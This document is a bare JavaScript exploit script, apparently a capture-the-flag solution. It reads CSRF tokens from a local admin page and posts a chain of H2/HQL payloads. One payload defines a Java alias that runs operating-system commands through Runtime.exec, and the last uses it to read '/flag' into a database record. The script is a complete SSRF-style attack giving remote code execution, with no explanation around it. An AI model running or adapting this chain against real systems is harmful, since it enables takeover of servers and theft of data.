
fetch('http://127.0.0.1/admin')
  .then(r => r.text())
  .then(html => {
    const csrf = html.match(/name="csrf" value="([^"]+)"/)[1];

    const payload = `CALL SYSCALL('id')`;

    return fetch('http://127.0.0.1/admin/execute', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'hql=' + encodeURIComponent(payload) + '&csrf=' + csrf
    });
  })
  .then(r => r.text())
  .then(html => {
    const csrf2 = html.match(/name="csrf" value="([^"]+)"/)[1];


    const payload2 = `CREATE ALIAS IF NOT EXISTS EXEC AS $$ String exec(String cmd) throws Exception { Runtime rt = Runtime.getRuntime(); Process p = rt.exec(cmd); return new String(p.getInputStream().readAllBytes()); } $$`;

    return fetch('http://127.0.0.1/admin/execute', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'hql=' + encodeURIComponent(payload2) + '&csrf=' + csrf2
    });
  })
  .then(r => r.text())
  .then(html => {
    const csrf3 = html.match(/name="csrf" value="([^"]+)"/)[1];
    const payload3 = `UPDATE ScrapeResult SET pageTitle = EXEC('/flag') WHERE id = 1`;

    return fetch('http://127.0.0.1/admin/execute', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'hql=' + encodeURIComponent(payload3) + '&csrf=' + csrf3
    });
  });
